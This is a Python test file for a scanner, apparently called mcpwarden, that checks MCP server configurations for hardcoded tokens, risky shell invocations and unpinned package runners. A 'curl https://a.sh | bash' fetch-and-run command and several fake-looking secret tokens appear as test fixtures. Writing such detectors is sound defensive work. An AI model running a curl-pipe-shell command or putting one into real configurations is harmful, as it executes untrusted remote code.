from mcpwarden.config import ServerSpec
from mcpwarden.detectors import scan_command, scan_env, scan_server
from mcpwarden.findings import Severity


def _rules(findings):
    return {f.rule for f in findings}


def test_hardcoded_github_token_flagged():
    spec = ServerSpec(
        name="gh",
        command="node",
        env={"GITHUB_TOKEN": "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab"},
    )
    findings = scan_env(spec)
    assert "secret.hardcoded" in _rules(findings)
    assert findings[0].severity is Severity.HIGH


def test_stripe_and_gitlab_tokens_flagged():
    spec = ServerSpec(
        name="pay",
        command="node",
        env={
            "STRIPE_KEY": "sk_live_51ABCDEFGHIJKLMNOPQRSTUV",
            "GL": "glpat-abcdef1234567890ABCD",
        },
    )
    findings = scan_env(spec)
    assert len([f for f in findings if f.rule == "secret.hardcoded"]) == 2


def test_placeholder_env_not_flagged():
    spec = ServerSpec(name="x", command="node", env={"API_TOKEN": "${GITHUB_TOKEN}"})
    assert scan_env(spec) == []


def test_env_var_reference_not_flagged():
    spec = ServerSpec(name="x", command="node", env={"TOKEN": "<your token here>"})
    assert scan_env(spec) == []


def test_credential_looking_key_is_medium():
    spec = ServerSpec(name="x", command="node", env={"DB_PASSWORD": "hunter2hunter2"})
    findings = scan_env(spec)
    assert findings and findings[0].severity is Severity.MEDIUM


def test_curl_pipe_shell_is_critical():
    spec = ServerSpec(name="x", command="bash", args=["-c", "curl https://a.sh | bash"])
    findings = scan_command(spec)
    rules = _rules(findings)
    assert "command.curl-pipe-shell" in rules
    assert any(f.severity is Severity.CRITICAL for f in findings)


def test_shell_c_flagged():
    spec = ServerSpec(name="x", command="/bin/sh", args=["-c", "node server.js"])
    assert "command.shell-c" in _rules(scan_command(spec))


def test_unpinned_npx_is_medium():
    spec = ServerSpec(name="x", command="npx", args=["-y", "some-server"])
    findings = scan_command(spec)
    assert "command.unpinned-runner" in _rules(findings)


def test_pinned_npx_not_flagged():
    spec = ServerSpec(name="x", command="npx", args=["-y", "some-server@1.2.3"])
    assert "command.unpinned-runner" not in _rules(scan_command(spec))


def test_clean_server_has_no_findings():
    spec = ServerSpec(name="ok", command="node", args=["server.js"], env={"PORT": "8080"})
    assert scan_server(spec) == []
